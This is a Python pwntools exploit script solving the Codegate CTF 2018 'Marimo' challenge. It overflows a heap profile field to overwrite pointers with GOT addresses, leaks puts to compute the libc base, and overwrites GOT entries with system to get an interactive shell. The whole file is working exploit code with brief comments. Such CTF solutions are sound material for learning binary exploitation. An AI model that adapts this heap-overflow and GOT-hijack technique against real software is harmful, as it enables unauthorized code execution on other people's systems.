#!/usr/bin/python

#Codegate CTF 2018 Marimo

from pwn import *

#vmmap after r binary in gdb
libc=ELF("./libc-2.23.so")

r=process("./marimo")
#gdb.attach(r)


#Build the action functions
def add(name,profile):
	r.sendline("show me the marimo")
	r.recvuntil(">> ")
	r.sendline(name)
	r.recvuntil(">>")
	r.sendline(profile)
	r.recvuntil(">> ")
	sleep(2)

def modify(viewNumber, profile):
	r.sendline("V")
	r.sendline(str(viewNumber))
	r.sendline("M")
	r.recvuntil(">> ")
	r.sendline(profile)
	r.recvuntil(">> ")
	r.sendline("B")
	r.recvuntil(">> ")
	sleep(2)

pause()
#Leak the full address of PUTS via overwrite the PUTS address in GOT 
#with the name pointer field in heap memory and 
malloc_got = 0x603050
puts_got   = 0x603018
strcmp_got = 0x603040

r.recvuntil(">> ")

add("AAAA","BBBB")
add("CCCC","DDDD")
#Need  p64(puts_got) and p64(strcmp_got) because we will use the second one 
#because for the profile hijacking the system and put it as system library instead of strcmp
modify(0,56*"a"+p64(puts_got)+p64(strcmp_got))
r.recvuntil(">> ")
r.recvuntil(">> ")
#r.interactive()

r.sendline("V")
r.sendline(str(1))
r.recvuntil("name : ")
leak_put_address = r.recvuntil("\n")
print leak_put_address
 #\x90\xa6\xabU\x8a\x7f

#Convert the leaked address into string and remove \n so need use [:-1] and padding with ljust with 0x00
leak_put_address = hex(u64(leak_put_address[:-1].ljust(8,"\x00")))

print leak_put_address
#Full address: 0x7fa2670e1690ls

#Calculate libc_base
libc_base = int(leak_put_address,16) - libc.symbols["puts"]

#Find system and calculate system: 
system = libc_base + libc.symbols['system']
print hex(system)
#pause()

r.sendline("M")
r.sendline(p64(system)+p64(system))

sleep(5)
r.interactive()